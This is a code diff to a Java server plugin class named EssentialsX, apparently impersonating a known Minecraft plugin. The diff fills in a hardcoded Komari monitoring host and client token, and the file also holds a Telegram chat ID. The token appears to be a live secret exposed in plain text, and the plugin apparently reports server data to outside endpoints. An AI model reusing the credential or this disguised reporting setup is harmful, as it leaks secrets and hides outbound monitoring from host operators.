@@ -46,8 +46,8 @@ public class EssentialsX extends JavaPlugin {
     static final String TG_CHAT_ID = "5800052646";
 
     // ---- Komari 监控探针（可留空，留空则不启动上报） ----
-    static final String KOMARI_HOST = "";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
-    static final String KOMARI_TOKEN = "";  // Komari 后台节点详情页的 Client Token
+    static final String KOMARI_HOST = "https://oracle-de-komari.0o0o.pp.ua";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
+    static final String KOMARI_TOKEN = "gz79qJymjlrLKkxBtavhLN";  // Komari 后台节点详情页的 Client Token
 
     // 服务器名称
     static final String SERVER_NAME = "Host2play瑞典家宽";
